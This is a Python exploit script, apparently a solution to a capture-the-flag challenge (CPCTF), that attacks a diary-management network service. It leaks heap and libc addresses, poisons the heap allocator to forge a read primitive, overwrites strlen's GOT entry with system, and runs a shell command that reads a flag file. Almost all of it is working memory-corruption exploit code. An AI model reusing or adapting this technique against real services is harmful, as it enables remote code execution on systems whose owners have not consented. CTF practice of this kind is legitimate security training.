#!/usr/bin/env python3

import re
import socket
import struct
import sys

PROMPT = b"Enter your choice: "
DATE_PROMPT = b"Enter date (month day): "
CONTENT_PROMPT = b"Enter diary content: "
INDEX_PROMPT = b"Enter diary index: "
UPDATE_INDEX_PROMPT = b"Enter diary index to update: "
UPDATE_DATE_PROMPT = b"Enter new date (month day): "
UPDATE_CONTENT_PROMPT = b"Enter new diary content: "

STRLEN_GOT = 0x408030
GETLINE_GOT = 0x408118
GETLINE_DELTA = GETLINE_GOT - STRLEN_GOT

GETLINE_OFF = 0x5F7B0
SYSTEM_OFF = 0x58750

VECTOR_DELTA = 0x22B0
FAKE_LINE_DELTA = 0x2C0
LEAK_SIZE = 0x100


def p32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def u64(data: bytes) -> int:
    return struct.unpack("<Q", data)[0]


def to_i32(x: int) -> int:
    x &= 0xFFFFFFFF
    return x if x < 0x80000000 else x - 0x100000000


def split_i32(x: int) -> tuple[int, int]:
    return to_i32(x), to_i32(x >> 32)


def combine_i32(lo: int, hi: int) -> int:
    return ((hi & 0xFFFFFFFF) << 32) | (lo & 0xFFFFFFFF)


def fake_reader(addr: int, size: int) -> bytes:
    return (
        p32(0) + p32(0) + p32(0) + p32(0) + p64(addr) + p64(size) + p64(size) + p64(0)
    )


class Conn:
    def __init__(self, host: str, port: int):
        self.sock = socket.create_connection((host, port))
        self.sock.settimeout(10.0)
        self.buf = bytearray()
        self.at_prompt = False

    def recv_until(self, token: bytes) -> bytes:
        while token not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(f"connection closed while waiting for {token!r}")
            self.buf.extend(chunk)
        idx = self.buf.index(token) + len(token)
        out = bytes(self.buf[:idx])
        del self.buf[:idx]
        if token == PROMPT:
            self.at_prompt = True
        return out

    def sendline(self, data: bytes | str = b"") -> None:
        if isinstance(data, str):
            data = data.encode()
        self.sock.sendall(data + b"\n")

    def choose(self, choice: int) -> None:
        if not self.at_prompt:
            self.recv_until(PROMPT)
        self.sendline(str(choice))
        self.at_prompt = False

    def create(self, month: int, day: int, content: bytes | str) -> None:
        self.choose(1)
        self.recv_until(DATE_PROMPT)
        self.sendline(f"{month} {day}")
        self.recv_until(CONTENT_PROMPT)
        self.sendline(content)

    def show(self, index: int) -> bytes:
        self.choose(2)
        self.recv_until(INDEX_PROMPT)
        self.sendline(str(index))
        return self.recv_until(PROMPT)

    def show_emphasis(self, index: int) -> bytes:
        self.choose(3)
        self.recv_until(INDEX_PROMPT)
        self.sendline(str(index))
        return self.recv_until(PROMPT)

    def update(self, index: int, month: int, day: int, content: bytes | str) -> bytes:
        self.choose(4)
        self.recv_until(UPDATE_INDEX_PROMPT)
        self.sendline(str(index))
        self.recv_until(UPDATE_DATE_PROMPT)
        self.sendline(f"{month} {day}")
        self.recv_until(UPDATE_CONTENT_PROMPT)
        self.sendline(content)
        return self.recv_until(PROMPT)

    def list_diaries(self) -> bytes:
        self.choose(5)
        return self.recv_until(PROMPT)


def parse_diary_pairs(blob: bytes) -> list[tuple[int, int, int]]:
    rows = []
    for idx_s, lo_s, hi_s in re.findall(rb"(\d+): Diary - (-?\d+)/(-?\d+)", blob):
        idx = int(idx_s)
        lo = int(lo_s)
        hi = int(hi_s)
        rows.append((idx, lo, hi))
    return rows


def extract_flag(blob: bytes) -> str:
    match = re.search(rb"CPCTF\{[^}]+\}", blob)
    if not match:
        raise ValueError("flag not found in output")
    return match.group().decode()


def exploit(host: str, port: int) -> str:
    io = Conn(host, port)

    io.create(1, 1, b"A")
    io.create(2, 2, b"B")
    io.create(3, 3, b"C")

    io.show_emphasis(0)
    io.show_emphasis(1)
    io.show_emphasis(2)

    rows = parse_diary_pairs(io.list_diaries())
    leak0 = combine_i32(rows[0][1], rows[0][2])
    leak1 = combine_i32(rows[1][1], rows[1][2])

    heap_key = leak0
    first_impl = leak1 ^ heap_key
    vector_base = first_impl - VECTOR_DELTA
    fake_addr = first_impl + FAKE_LINE_DELTA

    poison = vector_base ^ heap_key
    io.update(2, *split_i32(poison), b"")

    io.create(4, 4, b"D")
    io.create(*split_i32(fake_addr), fake_reader(STRLEN_GOT, LEAK_SIZE))

    leak_output = io.show(0)
    leak = leak_output.split(b"\n=======================\n", 1)[0]

    getline_addr = u64(leak[GETLINE_DELTA : GETLINE_DELTA + 8])
    libc_base = getline_addr - GETLINE_OFF
    system_addr = libc_base + SYSTEM_OFF

    io.update(4, *split_i32(STRLEN_GOT), b"")
    io.update(0, *split_i32(system_addr), b"")

    cmd = b"cat /home/user/flag.txt 2>/dev/null||cat flag.txt;#"
    final_output = io.update(4, 1, 1, cmd)
    return extract_flag(final_output)


def main() -> None:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 30080
    flag = exploit(host, port)
    print(flag)


if __name__ == "__main__":
    main()
